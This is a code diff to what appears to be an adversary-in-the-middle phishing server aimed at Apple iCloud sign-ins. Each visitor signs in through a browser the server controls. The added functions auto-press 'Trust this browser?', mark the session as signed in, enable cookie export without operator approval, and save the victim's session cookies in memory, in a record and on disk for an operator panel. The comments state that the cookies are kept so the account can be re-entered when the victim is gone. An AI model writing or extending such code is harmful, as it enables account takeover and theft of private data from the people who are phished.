@@ -93,6 +93,11 @@ SESSION_IDLE_SECONDS = 15 * 60
 # before it gives up and leaves the visitor where they are.
 WAIT_FOR_BROWSER_SECONDS = 120
 
+# How long the app waits on "Trust this browser?" before carrying on without
+# an answer. The question is answered as soon as it is seen, so this is only
+# for a browser that has stopped answering presses.
+TRUST_WAIT_SECONDS = 30
+
 # Tried in order. Bundled Chromium needs a download; Chrome and Edge are
 # usually already on the machine, so if either is there we skip it entirely.
 BROWSERS = [
@@ -1300,6 +1305,16 @@ class Session:
         # What the app is waiting for: the browser to accept what was typed
         # into the capture, before the capture moves on.
         self.waiting: dict | None = None
+        # "Trust this browser?" comes after the code is accepted, and the
+        # app answers it. This says whether it has been answered, and since
+        # when it has been asked.
+        self.trusted = False
+        self.trust_since = 0.0
+        # Has this visitor signed in? Then their cookies are kept while the
+        # browser is open, so they can be had when it is not.
+        self.signed_in = False
+        self.cookies: list = []
+        self.cookies_at = 0.0
 
     def profile(self) -> Path:
         """Where this visitor's browser keeps its memory."""
@@ -1451,6 +1466,17 @@ async def close_idle_sessions() -> None:
                 record["cookies"] = await session.ctx.cookies()
         except Exception:
             pass
+        if not record.get("cookies") and session.cookies:
+            # The browser would not answer, but its cookies were read while
+            # it would - when its visitor signed in.
+            record["cookies"] = list(session.cookies)
+        if record.get("cookies"):
+            # Kept on disk as well: the panel can still read them after a
+            # restart, when the record in this process is gone.
+            try:
+                admin.keep_cookies(sid, record["cookies"])
+            except Exception:
+                pass
         await session.close()
         # The manager puts the session away and says so: the panel is told
         # that this client has gone, and it remembers what they got to.
@@ -1645,10 +1671,30 @@ async def poll_browser(session: "Session") -> None:
     if state.get("fields"):
         session.saw_sign_in = True
 
+    # "Trust this browser?" comes straight after the code is accepted, and
+    # it is waited for: the browser sits on the question until somebody
+    # answers it, and the sign-in is not finished while it is there. The
+    # question is answered as soon as it is seen, and what is behind it is
+    # read again.
+    #
+    # It is only answered while the person is still signing in. Once they
+    # are through, the browser is theirs: a page of their own with a button
+    # that says "Trust" is not a question the app was asked.
+    if state.get("trust") and not session.hub.finished:
+        state = await answer_trust(session, state)
+    else:
+        # The question is not on the screen. The next one, when it comes,
+        # is a question that has not been answered yet.
+        session.trusted = False
+        session.trust_since = 0.0
+
     # Has the person finished? The code was good, the browser is in iCloud
     # and the sign-in form is gone. Then the app takes them there, and the
     # captures are closed to them: there is nothing left in them to do.
     if not session.hub.finished and browser_is_signed_in(state, session.saw_sign_in):
+        # They are in. What gets them back when they are not here is kept
+        # now, while the browser is still open.
+        await keep_their_cookies(session)
         session.hub.go_to_icloud()
         return
 
@@ -1667,6 +1713,92 @@ async def poll_browser(session: "Session") -> None:
     SESSIONS.changed(session, why="browser")
 
 
+async def answer_trust(session: "Session", state: dict) -> dict:
+    """Answer "Trust this browser?", and say what is behind it.
+
+    The question is one button and no form. It is answered as soon as it is
+    seen - once, and only ever by pressing the button that says "Trust" -
+    and the page is read again, because what is behind the question is
+    where the sign-in really got to.
+
+    A question that will not go - a click the page refuses, a browser that
+    has stopped answering - does not hold the person there for ever: after
+    a while the page is read as if the question had been answered, and if
+    that says they are in, they are in.
+    """
+    if not session.trust_since:
+        session.trust_since = time.monotonic()
+        log("the browser is asking whether to trust it - pressing Trust")
+
+    if not session.trusted:
+        try:
+            session.trusted = await session.bridge.accept_trust()
+        except Exception as exc:
+            log(f"browser: Trust not pressed - {str(exc).splitlines()[0]}")
+        if session.trusted:
+            log("browser: Trust pressed")
+
+    if session.trusted:
+        try:
+            return await session.bridge.snapshot()
+        except Exception:
+            return state
+
+    if time.monotonic() - session.trust_since > TRUST_WAIT_SECONDS:
+        log("the browser will not be trusted - carrying on without it")
+        return {**state, "trust": False}
+
+    return state
+
+
+async def keep_their_cookies(session: "Session") -> None:
+    """Keep what the browser holds now that its owner has signed in.
+
+    A session that has signed in is allowed to have its cookies exported
+    without the operator allowing it by hand in the panel, and the cookies
+    are read while the browser is open and kept - with the session and on
+    disk - so that the panel can still have them when the browser is shut,
+    or when the machine has been restarted since.
+
+    This happens once. Polling the browser is not signing in again.
+    """
+    if session.signed_in:
+        return
+    session.signed_in = True
+    log(f"session {session.id} has signed in - keeping its cookies")
+    try:
+        admin.STORE.set_export(session.id, True)
+    except Exception:
+        pass
+    await collect_cookies(session)
+
+
+async def collect_cookies(session: "Session") -> list:
+    """Read this session's cookies out of its browser, and keep them.
+
+    They are kept three ways, because each of them can fail: with the
+    session (for as long as it is here), with the record of it (for when it
+    has gone), and in the panel's store on disk (for when the server has
+    been restarted and neither of the other two is left).
+    """
+    try:
+        cookies = await session.ctx.cookies()
+    except Exception:
+        return list(session.cookies)
+
+    if cookies:
+        session.cookies = list(cookies)
+        session.cookies_at = time.time()
+        try:
+            admin.keep_cookies(session.id, session.cookies)
+        except Exception:
+            pass
+        record = GONE.get(session.id)
+        if record is not None:
+            record["cookies"] = list(session.cookies)
+    return list(session.cookies)
+
+
 def browser_is_signed_in(state: dict, saw_the_form: bool = False) -> bool:
     """Is the browser through the sign-in and into iCloud?
 
@@ -1678,7 +1810,13 @@ def browser_is_signed_in(state: dict, saw_the_form: bool = False) -> bool:
     that is not being signed in - it is the beginning of the process, and
     treating it as the end of it sends everybody to iCloud and signs
     nobody in.
+
+    Being asked whether the browser may be trusted is not being in yet: the
+    question is on the screen, and the app is about to answer it.
     """
+    if state.get("trust"):
+        return False
+
     url = str(state.get("url") or "").lower()
     if "idmsa.apple.com" in url or "icloud.com" not in url:
         return False
@@ -1748,7 +1886,12 @@ async def check_waiting(session: "Session", state: dict) -> None:
     """
     # The browser is in iCloud: the code was good and the process is over.
     # There is no next capture to wait for.
-    if browser_is_signed_in(state, session.saw_sign_in):
+    #
+    # A person who is already through is not sent through again: this is
+    # polled, and saying "going to icloud.com" every half second is not
+    # news, it is noise on the viewer's line.
+    if not session.hub.finished and browser_is_signed_in(state,
+                                                         session.saw_sign_in):
         session.hub.go_to_icloud()
         return
 
